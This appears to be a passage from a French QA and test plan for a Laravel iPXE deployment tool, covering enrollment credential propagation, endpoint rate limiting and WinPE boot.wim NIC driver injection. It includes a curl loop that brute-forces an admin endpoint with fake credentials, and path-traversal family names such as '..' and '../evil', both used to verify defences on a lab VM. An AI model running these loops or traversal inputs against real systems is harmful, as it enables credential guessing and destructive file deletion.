curl -sS -X POST "http://192.168.122.50/ipxe/enrollment/room" \
     --data "$PAYLOAD&$CREDS" | head -20

# 2e hit enrollment/room après "choose" (poste re-chain `##params`)
curl -sS -X POST "http://192.168.122.50/ipxe/enrollment/room" \
     --data "$PAYLOAD&$CREDS&room=42" | grep -E "Acces refuse|ajoutee"
# Attendu : `ajoutee a la salle …` (PAS `Acces refuse - identifiants requis`).
```

**Attendu** : aucun POST ne retourne `Acces refuse - identifiants requis` au
2ème hit — les params propagés (`param username ${username}` +
`param password ${password:base64}`) garantissent la persistance des creds
cross-chain dans le settings store iPXE.

#### Scénario 4.10-9 — Rate-limit 30/min/IP sur endpoints sensibles (patch #15)

Garde-fou anti brute-force LAN : les 12 endpoints iPXE protégés par
`IpxeAuthService::guard()` (admin, maintenance, action/*, installation-*,
clonezilla-menu, enrollment/*) sont throttlés à `30 req/min/IP`. Un firmware
iPXE légitime fait au plus 2-3 hits/min par poste — 30/min couvre les retries
firmware et coupe net une boucle d'attaque dictionnaire.

```bash
# Reset éventuel du bucket (laravel cache)
ssh /vm 'cd /var/www/sambaedu-reload && php artisan cache:clear'

# Spammer 31 POST `/ipxe/admin` avec creds invalides depuis une même IP
for i in $(seq 1 31); do
  STATUS=$(curl -sS -o /dev/null -w "%{http_code}" -X POST \
    http://192.168.122.50/ipxe/admin \
    --data "mac=aa:bb:cc:11:22:33&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&username=attacker&password=$(printf 'wrong' | base64)")
  echo "hit #$i → $STATUS"
done
```

**Attendu** : 30 premiers hits = `200` (écran iPXE `Acces refuse - identifiants
invalides`), 31ème hit = `429 Too Many Requests`. Couverture automatisée :
`IpxeAdminAuthTest::it_rate_limits_admin_endpoint_after_30_failures`.

## Story 3.10 — Injection pilotes NIC boot.wim WinPE

**Contexte (cause racine, NE PAS re-débattre).** Depuis Windows 11 24H2,
Microsoft a retiré des pilotes Intel LAN legacy (`e1d`, ex. I219) du `boot.wim`.
Sur un poste à NIC non-inbox, WinPE ne monte pas le réseau → le `@PING` de
l'`install.bat` échoue (« défaillance générale ») et l'installation ne démarre
jamais. Le SEUL levier pour le NIC est le `boot.wim` lui-même (`z:\os\drivers`
de l'unattend exige déjà le réseau = chicken-and-egg). Cf. mémoire
`project_winpe_nic_driver_boot_wim_gap`. PoC validée e2e le 2026-06-26 (lab1,
Lenovo ThinkCentre M700 / Intel I219, 100 % Linux).

**Régression 3.6 corrigée.** `WindowsIsoExtractor::extract()` ré-extrait l'ISO
et écrase le `boot.wim` à chaque déploiement → une injection DISM one-shot ne
tient pas. L'injection est désormais **rejouée automatiquement** à chaque
extraction (service `WinpeDriverInjector`), idempotente *par construction* (le
`cp -R` depuis l'ISO donne toujours un wim pristine).

### Prérequis système (provisioning)

**Automatique via `scripts/install.sh`** : la fonction `install_ipxe_winpe_deps`
(Phase 3) installe `wimtools` + `innoextract` + `unzip`, vérifie la présence des
binaires (`wimlib-imagex`/`innoextract`/`unzip`) et crée le pack
`storage/install/winpe-drivers/` (vide = no-op à l'injection) possédé par
www-admin. `install.sh` rejoue aussi `update.sh` en fin de course.

```bash
# Installation neuve : rien à faire, install.sh s'en charge.
# Parc DÉJÀ installé (ex. VM existante) — rejouer la phase manuellement :
ssh /vm 'apt-get install -y wimtools innoextract unzip'
# wimtools fournit `wimlib-imagex` (injection, en www-admin SANS sudo).
# innoextract : ingestion des .exe InnoSetup Lenovo (7z ne voit que les
#               sections PE et rate les fichiers pilote — validé PoC).
# unzip       : ingestion des .zip Intel.
```

> **Note hôte de dev** : `wimlib-imagex` et `unzip` présents ; `innoextract`
> souvent absent (installer pour tester l'ingestion `.exe`, ou s'appuyer sur le
> `Process::fake()` des tests). L'extension PHP `zip` (ZipArchive) n'est PAS
> chargée sur l'hôte de test — les tests construisent les `.zip` via le binaire
> `zip`.

### Actions VM post-merge (cf. project_vm_config_cache_not_synced)

```bash
ssh /vm 'cd /var/www/sambaedu-reload && php artisan config:cache && \
         chown www-admin:www-admin bootstrap/cache/*.php'
# Créer le pack persistant (gitignored, hors de l'arbre extrait) :
ssh /vm 'mkdir -p /var/www/sambaedu-reload/storage/install/winpe-drivers && \
         chown -R www-admin:www-admin /var/www/sambaedu-reload/storage/install/winpe-drivers'
```

### Emplacement du pack

- **Défaut** : `storage/install/winpe-drivers/<famille>/` (server-side
  uniquement, gitignored, NON servi aux postes — ils reçoivent un `boot.wim`
  déjà injecté). Override : `IPXE_WINPE_DRIVERS_PATH` (poser
  `/var/sambaedu/unattended/install/os/winpe-drivers` reproduit le PoC).
- **Invariant** : vit HORS `{deployed_os_base_path}/Win{N}` pour échapper au
  `sudo rm -rf <target>` de l'extraction (persistance).
- Structure : `<famille>/` (ex. `intel-i219/`) contenant les triplets `.inf` +
  `.sys` + `.cat`. Plusieurs familles coexistent (chacune injectée à
  `\drivers\<famille>` dans le wim, index 2).

### Ingestion des pilotes — DEUX canaux (D3)

**A. CLI (admin avec shell)**

```bash
# .exe Lenovo (InnoSetup → innoextract)
ssh /vm 'cd /var/www/sambaedu-reload && \
  php artisan ipxe:winpe-drivers:ingest intel-i219 /root/u1etn20us14avc.exe'

# .zip Intel (→ unzip)
ssh /vm 'cd /var/www/sambaedu-reload && \
  php artisan ipxe:winpe-drivers:ingest intel-i219 /root/intel-pack.zip'
```

**Attendu** : récap des `.inf` ingérés + exit 0. Échec propre (exit ≠ 0,
message clair, AUCUN pack partiel) si : archive non reconnue (ni `.exe` ni
`.zip`), binaire d'extraction absent (message nommant le paquet à installer),
ou aucun `.inf` dans l'archive.

**B. Upload UI Livewire** — page `/admin/ipxe/iso-windows` (Gate
`can:server.admin`), carte « Pilotes réseau WinPE (boot.wim) » : saisir la
famille, déposer l'archive `.exe`/`.zip`, cliquer « Ingérer les pilotes ». Un
toast confirme les `.inf` ingérés (ou l'erreur). La liste lecture-seule des
familles présentes est affichée. Même service partagé (`WinpeDriverIngestor`)
que la CLI — zéro duplication.

### Injection (automatique à l'extraction)

Au prochain téléchargement/dépôt d'ISO Windows (`/admin/ipxe/iso-windows`),
`WindowsIsoExtractor` injecte le pack dans le `boot.wim` (index BOOTABLE **2**,
piège : l'index 1 = Windows Setup ne charge rien au boot) + injecte
`nicload.cmd` à `\Windows\System32\`. Le `winpeshl.ini` chaîne
`nicload.cmd` (drvload récursif `X:\drivers\*.inf`) PUIS `install.bat`.

```bash
# Vérifier l'injection après extraction (sur la VM) :
ssh /vm 'wimlib-imagex dir /var/sambaedu/unattended/install/os/Win11/sources/boot.wim 2 \
         | grep -iE "drivers|nicload"'
# Attendu : /drivers/intel-i219/... + /Windows/System32/nicload.cmd
ssh /vm 'ls -l /var/sambaedu/unattended/install/os/Win11/sources/boot.wim'
# Attendu : owner www-admin:www-admin, mode 0666.
```

**No-op propre (zéro régression NIC inbox)** : si le pack est vide/absent,
l'injection est sautée (log info `ipxe.winpe.drivers.skipped_empty`), le
`boot.wim` reste le stock Microsoft intact — comportement 3.6 strictement
préservé.

**Échec d'injection** : `wimlib-imagex` absent / exit non-zéro / index invalide
→ `WinpeDriverInjectionException` (exit + stderr) remonte au
`DownloadWindowsIsoJob` qui marque le download `failed` (toast côté UI 3.6),
plutôt que de livrer un boot.wim incomplet (demi-boot).

### Scénario smoke e2e (M700 / I219)

1. Ingérer le pack Lenovo I219 : `php artisan ipxe:winpe-drivers:ingest intel-i219 <u1etn…exe>` (ou via l'UI).
2. (Re)déployer l'ISO Win11 24H2+ depuis `/admin/ipxe/iso-windows`.
3. Vérifier l'injection (commande `wimlib-imagex dir … 2` ci-dessus).
4. Booter un Lenovo ThinkCentre M700 (NIC Intel I219) en iPXE → installation
   Windows. **Attendu** : le réseau monte dans WinPE (`nicload.cmd` `drvload` le
   pilote), le `@PING <se4fsIp>` de l'`install.bat` répond, l'installation
   démarre (plus de boucle infinie `IPCONFIG /RENEW`→`PING`).
5. **Non-régression** : un poste à NIC inbox (pack vide OU famille non concernée)
   boote exactement comme en 3.6.

### Couverture automatisée

- `tests/Unit/Ipxe/Iso/WinpeDriverInjectorTest` — no-op pack vide (aucun
  wimlib), commande `add` index 2 par famille, injection `nicload.cmd`, jamais
  index 1, exception sur exit non-zéro (`Process::fake()`).
- `tests/Feature/Ipxe/Iso/IngestWinpeDriversCommandTest` — dispatch innoextract
  vs unzip, archive inconnue, binaire absent, aucun `.inf`, nom de famille
  invalide ; chemin succès `.zip` réel (binaire `zip`/`unzip`).
- `tests/Feature/Ipxe/Iso/WinpeDriverIngestLivewireTest` — upload UI (succès,
  extension inconnue, famille invalide, aucun `.inf`, liste lecture-seule) +
  invariants `project_livewire_reserved_upload_method` (action `ingestDrivers`,
  `getRealPath()`, jamais `move()`).
- `WindowsIsoExtractorTest::it_does_not_run_wimlib_when_driver_pack_is_empty` —
  non-régression 3.6.
- `IpxeNamespaceTest` (3 méthodes 3.10) — emplacements/exceptions, CRLF strict +
  ordre nicload→install, `WindowsInstallBatBuilder` sans drvload (D2/AC3.3).

### Post-correctifs & non-régressions (review 3.10)

| Incident | Sévérité | Couvert par |
|---|---|---|
| M1 — `famille = ..`/`.` échappe le pack → suppression récursive de `storage/install` (ISO sources) | 🔴 Critique | `IngestWinpeDriversCommandTest::it_rejects_dot_only_family_names` (5 cas) |
| #5 — résidu root-owned mélangé après purge silencieuse | 🟠 | garde `directoryHasFiles()` → exception explicite |
| #1 — `.INF` majuscules comptés 0 par l'UI (scan case-sensitive) | 🟠 | `collectFamilies()` partagé (récursif + casse) |
| #3 — gate `server.admin` non prouvée | 🟡 | `WinpeDriverIngestLivewireTest::it_forbids_the_component_for_a_non_admin` |

#### Scénario 3.10-7 — Path traversal nom de famille (incident M1, à dérouler en manuel)

> Angle de test nouveau : un bug **catastrophique** (perte des ISO sources) invisible aux tests unitaires initiaux car le seul cas testé était `../evil` (avec `/`, bloqué). Le `..` nu passe la regex liste-blanche.

1. **Pré-requis** : pack `storage/install/winpe-drivers/` peuplé + au moins une ISO source présente sous `storage/install/iso/`.
2. **CLI** : `php artisan ipxe:winpe-drivers:ingest .. /chemin/pack.zip` → **doit** échouer (exit 1, « au moins un caractère alphanumérique requis ») **sans** rien supprimer. Vérifier `storage/install/iso/` intact.
3. Répéter avec `.`, `...`, `--`, `__` → tous refusés.
4. **UI** : sur `/admin/ipxe/iso-windows`, saisir `..` en famille + déposer une archive → toast d'erreur, aucune suppression.
5. Cas nominal `intel-i219` → toujours accepté (non-régression).
